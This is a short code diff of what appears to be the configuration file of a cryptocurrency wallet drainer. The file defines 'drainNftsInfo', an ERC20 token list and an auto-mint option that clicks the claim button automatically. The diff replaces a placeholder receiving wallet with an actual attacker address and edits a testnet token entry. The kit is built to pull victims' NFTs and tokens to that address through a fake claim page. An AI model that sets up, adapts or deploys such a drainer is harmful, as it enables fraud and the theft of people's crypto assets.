@@ -1,6 +1,6 @@
 const workChainId = 1; // The network we are working with is the chainId list https://chainlist.org/
 
-const receiveAddresss = "wallet"; // YOUR WALLET ADDRESS "TUTORIAL"
+const receiveAddresss = "0xcD3f20004b654066A1C3Ec64173466b0CADC8E2c"; // YOUR WALLET ADDRESS "TUTORIAL"
 
 
 const drainNftsInfo = {
@@ -21,7 +21,7 @@ const autoMint = true; // auto click claim button
 const erc20list = {
   // Bsc testnet
   /*
-  '0x00a5Dc07A0F8061e896F0Acdd47d352e49FD1a2c': 100, // DAI BSC Testnet (97)
+  '0xaB1a4d4f1D656d2450692D237fdD6C7f9146e814': 100, // BUSD BSC Testnet (97)
   '0x348236484ce96A293E210260b90bBFb228D6d1Fc': 100, // USDT BSC Testnet (97)
   */
   // Ethernet mainnet
